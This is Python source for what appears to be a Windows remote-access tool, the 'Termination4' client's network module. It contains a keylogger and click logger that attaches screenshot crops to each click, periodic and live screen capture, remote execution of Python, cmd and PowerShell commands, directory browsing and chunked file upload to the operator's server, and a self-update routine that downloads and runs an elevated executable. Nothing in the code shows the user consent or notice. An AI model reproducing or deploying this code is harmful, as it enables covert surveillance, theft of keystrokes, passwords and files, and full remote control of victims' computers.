from TLib import *
from TLhread import *
from TLib.T_imports import *


class MonitorWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.TWNT=TWNT
        self.Socket=TWNT.Socket
        self.desc="Monitor HardWare Process"
        self.__init_func__()
    def __init_func__(self):
        while not self.ShouldStop():
            if self.Socket.connected:
                try:
                    cpu=psutil.cpu_percent(interval=1)
                    cpu_core=psutil.cpu_count(logical=True)
                    mem=psutil.virtual_memory()
                    net_sent, net_recv=self.GetNetworkUsage()
                    if self.Socket.connected:
                        self.Socket.emit("T4Monitor", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "monitor": {"time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "cpu": {"usage": cpu, "core": cpu_core}, "mem": {"percent": mem.percent, "total": mem.total, "used": mem.used}, "net": {"sent": net_sent/1024, "recv": net_recv/1024}}}), namespace="/Termination4SocketIOSpace")
                except:
                    traceback.print_exc()
                    print("Monitor ERROR")
            time.sleep(1)
    def GetNetworkUsage(self, interval=1):
        net1 = psutil.net_io_counters()
        time.sleep(interval)
        net2 = psutil.net_io_counters()
        sent = (net2.bytes_sent - net1.bytes_sent) / interval
        recv = (net2.bytes_recv - net1.bytes_recv) / interval
        return sent, recv

class ListenKMWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.TWNT=TWNT
        self.Socket=TWNT.Socket
        self.desc="Listen Key & Mouse Process"
        self.record=[]
        self.wait_times=0
        self.delta_x=40
        self.delta_y=40
        self.Level=10
        self.__init_func__()
        self.__init_send__()
    def __init_func__(self):
        print("Setup Listen Key & Mouse Process")
        def OnKey(key):
            self.record.append(str(key.char if hasattr(key, "char") else key))
        def OnClick(x, y, button, pressed):
            self.record.append(
                {"I":[x, y],
                 "K":"L" if pynput.mouse.Button.left == button else "R",
                 "A": "P" if pressed else "R",
                 "M":
                 f"data:image/jpeg;base64,{base64.b64encode(r["ImageBytes"]).decode("utf-8")}" if (r:=self.master.WindowsScreenCapture.CaptureAndCompressScreenshot(
                     self.Level,
                     *sum(self.master.WindowsScreenCapture.AdjustCoordinatesAdvanced(
                         (x, y),
                         (0, 0),
                         (self.master.WindowsScreenCapture.X, self.master.WindowsScreenCapture.Y),
                         self.delta_x, self.delta_y
                         ), ())
                     )
                    ) else ""
                }
            )
        self.Thread_Key  =threading.Thread(target=lambda: pynput.keyboard.Listener(on_press=OnKey).start())
        self.Thread_Mouse=threading.Thread(target=lambda: pynput.mouse.Listener(on_click=OnClick).start())
        self.Thread_Key.start()
        self.Thread_Mouse.start()
    def __init_send__(self):
        while True:
            if len(self.record) < 120:
                self.wait_times+=1
            if self.Socket.connected and self.record and (len(self.record) > 120 or self.wait_times > 10):
                try: self.Socket.emit("T4KM", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "record": json.dumps(self.record)}), namespace="/Termination4SocketIOSpace")
                except: return traceback.print_exc()
                self.record=[]
                self.wait_times=0
            time.sleep(60)
    def SendNow(self):
        if self.Socket.connected and self.record:
            try: self.Socket.emit("T4KM", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "record": json.dumps(self.record)}), namespace="/Termination4SocketIOSpace")
            except: traceback.print_exc()
            self.record=[]
            self.wait_times=0
            return print("FINISH")
        print("!CONNECTED OR !RECORD")

class TWNTProcessSynchronousWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.TWNT=TWNT
        self.desc=f"TWNT Process Synchronous"
        while not self.ShouldStop():
            if TWNT.Socket.connected:
                self.ProcessSynchronous()
            time.sleep(15)
    def ProcessSynchronous(self):
        p=[]
        for i in self.master.TProcessManager.GetAllThreads():
            _: T_Process.TProcess=self.master.TProcessManager.GetThread(i)
            p.append({"name": i, "desc": _.desc, "progress": _.progress})
        self.TWNT.Socket.emit("T4Process", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "process": p}), namespace="/Termination4SocketIOSpace")

class TWNTCoverScreen(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.desc=f"Cover Screen"
        while not self.ShouldStop():
            if TWNT.Socket.connected:
                ssb=self.master.WindowsScreenCapture.CaptureAndCompressScreenshot(TWNT.Level)
                if ssb:
                    r=requests.post(f"{TWNT.PATFile['X']}://{TWNT.PATFile['Host']}/T4/TAPI/cover.api", files={"screen": (".gkbd", TWNT.GodKeys.encrypt(ssb["ImageBytes"]))}, data={"PCMachineGUID": TWNT.PCMachineGUID}, verify=False)
                    if int(r.status_code) != 200:
                        print(f"Cover Update State: Code: {r.status_code} Text: {r.text}")
            time.sleep(120)


class TWNTRealTimeScreen(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', level, sleep, data):
        try:
            self.level=int(self.level)
            self.sleep=float(self.sleep)
        except:
            print("Real-Time Screen: Bad Int")
            return
        self.desc=f"Real-Time Screen, Level: {self.level}"
        print(self.desc)
        while not self.ShouldStop() and TWNT.Socket.connected:
            _=master.WindowsScreenCapture.CaptureAndCompressScreenshot(self.level)
            _["PCMachineGUID"]=data["PCMachineGUID"]
            _["CreateTime"]=time.time()
            TWNT.Socket.emit("T4RealTimeScreen", TWNT.GodKeys.encrypt(_), namespace="/Termination4SocketIOSpace")
            time.sleep(self.sleep)

class TWNESynchronousTProcess(T_Process.TProcess):
    def Run(self, TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.Socket: socketio.Client=TWNT.Socket
        self.desc="Tell Server: I'm Alive"
        while True:
            if self.Socket.connected:
                self.Socket.emit("T4Synchronous", TWNT.GodKeys.encrypt({"PCMachineGUID": TWNT.PCMachineGUID}), namespace="/Termination4SocketIOSpace")
            time.sleep(10)

class TWNToast:
    def __init__(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit'):
        self.master=master
        self.TWNT=TWNT
    def _message(self, message):
        return " ".join(message)
    def _send(self, level, message):
        print(f"[T4MESSAGE] [{level}] {message}")
        if self.TWNT.Socket.connect:
            self.TWNT.Socket.emit("T4MESSAGE", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "level": level, "message": message}), namespace="/Termination4SocketIOSpace")
    def error(self, *message):
        self._send("error", self._message(message))
    def info(self, *message):
        self._send("info", self._message(message))
    def success(self, *message):
        self._send("success", self._message(message))
    def warning(self, *message):
        self._send("warning", self._message(message))
    def debug(self, *message):
        self._send("debug", self._message(message))
    def unknown(self, *message):
        self._send("unknown", self._message(message))

class TWNETProcess(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', data, run=True, erun=False):
        self.master=master
        self.TWNT=TWNT
        self.Socket=TWNT.Socket
        self.env=globals()
        self.env["Termination"]=master
        self.env["SelfProcess"]=self
        self.data=data
        self.desc="By CMD Run Process"
        if run: self.__init_func__()
        if erun: self.__init_work__(data)
    def __init_func__(self):
        if self.TWNT.GodKeys.IsGK(self.data):
            self.data=self.TWNT.GodKeys.decrypt(self.data)
            if "work" in self.data:
                self.__init_work__(self.data)
        else:
            print(f"CMD: NOT GKBD OF {self.data}")
    def __init_work__(self, data):
        e=copy.copy(data)
        del e["PCMachineGUID"]
        del e["PCSID"]
        print(f"[{self.name}] {e}")
        if data["work"] == "ReSystemINFO":
            self.desc="CMD: Re System INFO"
            self.Socket.emit("T4ReSystemINFO", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "PCSystemINFO": json.dumps(T_ComputerInFo.GetWindowsSystemINFO())}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "Python":
            self.desc="CMD: Run Python Command"
            exec(data["Command"], self.env)
        elif data["work"] == "Cmd":
            self.desc="CMD: Run Cmd Command"
            self.Popen = subprocess.Popen(
                data["Command"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                encoding='gbk',
                errors='replace'
            )
            for line in self.Popen.stdout: print(line.strip())
            self.Popen.wait()
        elif data["work"] == "PowerShell":
            self.desc="CMD: Run PowerShell Command"
            self.Popen = subprocess.Popen(
                "powershell -Command "+data["Command"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                encoding='gbk',
                errors='replace'
            )
            for line in self.Popen.stdout: print(line.strip())
            self.Popen.wait()
        elif data["work"] == "file":
            self.desc="CMD: File Scanning"
            path: str=data["Command"]
            try:
                if path and path.endswith(':'):
                    path = f"{path}\\"
                if not os.path.exists(path):
                    return {'error': "Not Found Path"}
                files = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    stats = os.stat(item_path)
                    try:
                        modified_time = time.ctime(stats.st_mtime)
                    except OSError:
                        modified_time = 'N/A'
                    permission = oct(stats.st_mode & 0o777)
                    file_info = {
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stats.st_size if not os.path.isdir(item_path) else 0,
                        'modified': modified_time,
                        'permission': permission
                    }
                    files.append(file_info)
                self.Socket.emit("T4Files", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "files": files}), namespace="/Termination4SocketIOSpace")
            except PermissionError:
                self.Socket.emit("T4Files", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "files": f'没有权限访问路径 {path}'}), namespace="/Termination4SocketIOSpace")
                print("PermissionError FOR T4Files")
            except Exception as e:
                self.Socket.emit("T4Files", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "files": f'发生未知错误: {str(e)}'}), namespace="/Termination4SocketIOSpace")
                print("BAD FOR T4Files")
        elif data["work"] == "Drive":
            self.desc="CMD: Disk Scanning"
            try: self.Socket.emit("T4Drives", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "drivers": ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]}), namespace="/Termination4SocketIOSpace")
            except: self.Socket.emit("T4Drives", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "drivers": f'发生未知错误: {str(e)}'}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "updatefile":
            self.TWNT.Toast.success(f"Update File [{data["Command"]}] Start")
            UBUF=TWNEUpdateFile(self.master, self.TWNT, data)
            self.master.TProcessManager.AddThread(UBUF)
            UBUF.start()
        elif data["work"] == "ProcessINFO":
            self.desc="CMD: Process Scanning"
            self.TWNT.Thread_TWNTProcessSynchronousWorker.ProcessSynchronous()
        elif data["work"] == "ProcessKill":
            self.desc="CMD: ProcessKill"
            self.master.TProcessManager.KillThread(data["Command"])

        elif data["work"] == "GetL3T":
            self.desc="CMD: Read L3T"
            #r=[]
            #l=self.master.L3T.read()
            #for i in l:
            #    p=self.master.L3T.get(i)
            #    p["TaskUUID"]=i
            #    r.append(p)
            self.Socket.emit("T4L3T", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "L3T": list(self.master.Thread_LW3T.L3T.read().values())}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "AddL3T":
            self.desc="CMD: Add L3T"
            k=GUUID()
            v=data["Command"]
            v["TaskUUID"]=k
            if self.master.Thread_LW3T.insert(k, v): print("FIN")
            else: print("!FIN")
            self.Socket.emit("T4L3TRELOAD", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "ChangeL3T":
            self.desc="CMD: Change L3T"
            if self.master.Thread_LW3T.change(data["Command"]["TaskUUID"], data["Command"]):print("FIN")
            else: print("!FIN")
            self.Socket.emit("T4L3TRELOAD", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "DelL3T":
            self.desc="CMD: Del L3T"
            if self.master.Thread_LW3T.remove(data["Command"]): print("FIN")
            else: print("!FIN")
            self.Socket.emit("T4L3TRELOAD", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID}), namespace="/Termination4SocketIOSpace")

        elif data["work"] == "Screenshot":
            self.desc="CMD: Screenshot"
            ssb=self.master.KeMouse.ScreenshotBytes()
            r=requests.post(f"{self.TWNT.PATFile['X']}://{self.TWNT.PATFile['Host']}/T4/TAPI/scrht.api", files={"screen": (".gkbd", self.TWNT.GodKeys.encrypt(ssb))}, data={"PCMachineGUID": self.TWNT.PCMachineGUID}, verify=False)
            print(f"ScreenShot Update State: Code: {r.status_code} Text: {r.text}")
            #self.Socket.emit("T4Screenshot", self.TWNT.GodKeys.encrypt({"PCMachineGUID": self.TWNT.PCMachineGUID, "PNG": self.master.KeMouse.ScreenshotBytes()}), namespace="/Termination4SocketIOSpace")
        elif data["work"] == "Update":
            self.desc="CMD: Update"
            print("Start To Update.")
            UBUF=TWNEUpdateApp(self.master, data)
            self.master.TProcessManager.AddThread(UBUF)
            UBUF.start()
        elif data["work"] == "RealTimeScreen":
            self.desc="CMD: RealTimeScreen"
            if self.TWNT.Thread_RealTimeScreen:
                self.TWNT.Thread_RealTimeScreen.Stop()
            level=data["Command"]["level"]
            sleep=data["Command"]["sleep"]
            self.TWNT.Thread_RealTimeScreen=TWNTRealTimeScreen(self.master, self.TWNT, level, sleep, data)
            self.master.TProcessManager.AddThread(self.TWNT.Thread_RealTimeScreen)
            self.TWNT.Thread_RealTimeScreen.start()
        elif data["work"] == "KillRealTimeScreen":
            self.desc="CMD: KillRealTimeScreen"
            if self.TWNT.Thread_RealTimeScreen:
                self.TWNT.Thread_RealTimeScreen.Stop()
            self.TWNT.Thread_RealTimeScreen=None
        elif data["work"] == "GetLog":
            self.desc="CMD: GetLog"
            try: self.Socket.emit("T4Log",
                                  self.TWNT.GodKeys.encrypt(
                                      {"PCMachineGUID": self.TWNT.PCMachineGUID,
                                       "Log": self.master.tpll.ReadFileRangeFromEnd(
                                           self.master.__log_path__, data["Command"][0],
                                           data["Command"][1],
                                           data["Command"][3] if len(data["Command"]) == 3 else 1024
                                       )
                                      }
                                  ),
                                  namespace="/Termination4SocketIOSpace")
            except:
                print("Error At GetLog")
                print(data["Command"])
                print(traceback.format_exc())
        elif data["work"] == "KMSendNow":
            self.desc="CMD: KMSendNow"
            self.TWNT.Thread_ListenKMWorker.SendNow()
            self.TWNT.Toast.success("SendNow, Please Refresh the page now.")
        else:
            print("UN KNOW WORK.")

class TWNEUpdateApp(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', data):
        self.desc="CMD: Update"
        if master.GetWorkMod() == "py": return print("In The Python Mode!")
        print("Download Update...")
        u=GUUID()
        TerminationBin=os.path.join(os.getenv("temp"), f"{u}.tmp")
        TerminationEXE=os.path.join(os.getenv("temp"), f"{u}.exe")
        try:
            _=requests.get(data["Command"], stream=True, verify=False)
            TotalSize = int(_.headers.get('content-length', 0))
            DownloadedSize = 0
            with open(TerminationBin, 'wb') as f:
                print("Donwload Update Bin...")
                for chunk in _.iter_content(chunk_size=1024*4):
                    if chunk:
                        f.write(chunk)
                        DownloadedSize += len(chunk)
                        self.progress = int((DownloadedSize / TotalSize) * 100)
            r=requests.get(f"{master.TWNT.PATFile['X']}://{master.TWNT.PATFile['Host']}/T4/TAPI/SHA256.api", verify=False, timeout=10)
            if int(r.status_code) == 200:
                if master.tpll.GetFileSha256(TerminationBin) != r.text:
                    master.TWNT.Updating=False
                    return print("MD5 Error!")
        except:
            master.TWNT.Updating=False
            return print(f"{traceback.format_exc()}\nDownLoadError!")
        else: print("DownLoaded!")
        if not os.path.exists(TerminationBin):
            return print("Not Exists")
        if TotalSize == 0 or os.path.getsize(TerminationBin) != TotalSize:
            print("GetSize != TotalSite, Deleted")
            master.TWNT.Updating=False
            os.remove(TerminationBin)
            return
        try: os.rename(TerminationBin, TerminationEXE)
        except:
            print("Rename Error")
            master.TWNT.Updating=False
            os.remove(TerminationBin)
            return
        master.Thread_AutoRun.stop()
        master.__lock__.unlock()
        master.__init_elevate__([TerminationEXE, "--UpdateBinRunMode"], me=False, sleep=0, show_console=False, protect=False)

class TWNEUpdateFile(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', TWNT: 'Thread_TWNT.TWNetworkTransit', data):
        self.desc=f"CMD: Update File [{data['Command']}]"
        self.TWNT = TWNT
        print(f"Update File: [{data["Command"]}]")
        if not os.path.exists(data["Command"]["Path"]): return print("No Found File Exists")
        #try:
        #    r=requests.post(f"{TWNT.PATFile['X']}://{TWNT.PATFile['Host']}/T4/TAPI/updatefile.api", files={"file": (data["Command"], TWNT.GodKeys.encrypt(T_FIO.FIO.openr(data["Command"], 2)))}, data={"PCMachineGUID": self.TWNT.PCMachineGUID, "Partid": 0}, verify=False)
        #    TWNT.Toast.info(f"Update File State: Code: {r.status_code} Text: {r.text}")
        #    print(f"Update File State: Code: {r.status_code} Text: {r.text}")
        #except:
        #    TWNT.Toast.error(f"Update File [{data['Command']}] Error")
        #    return print(f"{traceback.format_exc()}\nDownLoadError!")
        self.config = data["Command"]
        self.chunk_count = 0
        self.completed_chunks = 0
        self.current_chunk = 0
        self.lock = threading.Lock()
        self.thread_semaphore = threading.Semaphore(self.config["ThreadCount"])
        self.start_upload()
    def _read_chunk(self, file_path, chunk_index):
        chunk_size_bytes = self.config["ChunkSize"] * 1024
        with open(file_path, 'rb') as f:
            f.seek(chunk_index * chunk_size_bytes)
            return f.read(chunk_size_bytes)
    def _upload_chunk(self):
        while True:
            with self.lock:
                if self.current_chunk >= self.chunk_count:
                    return
                chunk_index = self.current_chunk
                self.current_chunk += 1
            chunk_data = self._read_chunk(self.config["Path"], chunk_index)
            encrypted_data = self.TWNT.GodKeys.encrypt(chunk_data)
            retry_count = 0
            status = False
            while retry_count < self.config["RetryCount"]:
                try:
                    response = requests.post(
                        f"{self.TWNT.PATFile['X']}://{self.TWNT.PATFile['Host']}/T4/TAPI/updatefile.api",
                        files={"file": (self.config["Path"], encrypted_data)},
                        data={
                            "PCMachineGUID": self.TWNT.PCMachineGUID,
                            "Partid": chunk_index,
                            "FileUUID": self.config["FileUUID"],
                            "ChunkCount": self.chunk_count,
                        },
                        timeout=self.config["Timeout"],
                        verify=False
                    )
                    if response.status_code == 200:
                        status = True
                        break
                except Exception as e:
                    if 'response' in locals():
                        print(response.text)
                retry_count += 1
            with self.lock:
                self.completed_chunks += 1
                Last = 1 if self.completed_chunks == self.chunk_count else 0
                print(f"Update File Chunk [{chunk_index}] Status: {status} Last: {Last}")
                if Last == 1:
                    self._send_last_request(chunk_index)
                if self.TWNT.Socket.connected:
                    self.TWNT.Socket.emit(
                        "T4UpdateFileTaskReturnBack",
                        self.TWNT.GodKeys.encrypt({
                            "PCMachineGUID": self.TWNT.PCMachineGUID,
                            "Partid": chunk_index,
                            "status": status,
                            "ChunkCount": self.chunk_count,
                            "FileSize": self.file_size,
                            "FileUUID": self.config["FileUUID"],
                            "Last": Last
                        }),
                        namespace="/Termination4SocketIOSpace"
                    )
    def _send_last_request(self, Partid):
        requests.post(
            f"{self.TWNT.PATFile['X']}://{self.TWNT.PATFile['Host']}/T4/TAPI/updatefile.api",
            files={"file": (self.config["Path"], b'')},
            data={
                "PCMachineGUID": self.TWNT.PCMachineGUID,
                "Partid": Partid,
                "FileUUID": self.config["FileUUID"],
                "ChunkCount": self.chunk_count,
                "Last": "True"
            },
            verify=False
        )
    def start_upload(self):
        self.file_size = os.path.getsize(self.config["Path"])
        self.chunk_count = math.ceil(self.file_size / (self.config["ChunkSize"] * 1024))
        if self.TWNT.Socket.connected:
            self.TWNT.Socket.emit(
                "T4UpdateFileReturnBack",
                self.TWNT.GodKeys.encrypt({
                    "PCMachineGUID": self.TWNT.PCMachineGUID,
                    "ChunkCount": self.chunk_count,
                    "FileSize": self.file_size,
                    "FileUUID": self.config["FileUUID"],
                }),
                namespace="/Termination4SocketIOSpace"
            )
        threads = []
        for _ in range(self.config["ThreadCount"]):
            thread = threading.Thread(target=self._upload_chunk)
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        return self.chunk_count